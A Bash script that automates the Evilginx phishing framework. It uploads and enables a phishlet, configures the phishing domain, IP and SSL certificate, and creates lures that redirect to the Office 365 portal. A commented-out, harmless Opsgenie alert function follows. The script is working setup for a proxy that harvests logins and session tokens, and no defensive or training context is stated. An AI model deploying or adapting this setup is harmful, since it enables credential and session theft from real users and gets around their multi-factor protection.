#!/bin/bash
setup_evilginx() {
    echo "Setting up Evilginx for domain: $domain_name"

    # Load the phishlet
    sudo evilginx phishlets upload "$phishlet_path"

    # Enable the phishlet
    sudo evilginx phishlets enable example

    # Set up the hostname (domain or subdomain)
    sudo evilginx config domain "$subdomain"

    # Bind to the IP address
    sudo evilginx config ip "$host_ip"

    # Set up SSL using the provided certificate and key
    sudo evilginx config sslkey "$ssl_key_path"
    sudo evilginx config sslcert "$ssl_crt_path"
}

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    # Create the lure
    sudo evilginx lures create "$phishlet"

    # Get the generated URL (Assuming the command outputs it)
    local lure_url
    lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")

    # Set the redirect URL
    sudo evilginx lures redirect "$phishlet" "$redirect_url"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")

# Automate multiple lure creation
create_lure $default_phishlet $domain_name "https://portal.office.com"
setup_evilginx

# send_opsgenie_alert() {
#     # Parameters passed to the function
#     local API_KEY="$1"
#     local API_URL="$2"
#     local HTML_CODE="$3"

#     # Escape double quotes inside the HTML content
#     local ESCAPED_HTML_CODE=$(echo "$HTML_CODE" | sed 's/"/\\"/g')

#     # Define the alert payload parameters
#     local MESSAGE="HTML Code Test Alert"
#     local DESCRIPTION="Here is the HTML code:\n\n$ESCAPED_HTML_CODE"
#     local ALIAS="html-code-test-001"
#     local PRIORITY="P3"
#     local USER="user@example.com"

#     # Send the alert using curl
#     local response=$(curl -s -X POST "$API_URL" \
#       -H "Authorization: GenieKey $API_KEY" \
#       -H "Content-Type: application/json" \
#       -d '{
#             "message": "'"$MESSAGE"'",
#             "description": "'"$DESCRIPTION"'",
#             "alias": "'"$ALIAS"'",
#             "priority": "'"$PRIORITY"'",
#             "user": "'"$USER"'"
#           }')

#     # Output the response from the API
#     echo "Response: $response"
# }

# # Example usage of the function
# API_KEY="YOUR_OPSGENIE_API_KEY"
# API_URL="https://api.opsgenie.com/v2/alerts"
# HTML_CODE="<html><body><h1>This is a test HTML code</h1></body></html>"

# send_opsgenie_alert "$API_KEY" "$API_URL" "$HTML_CODE"
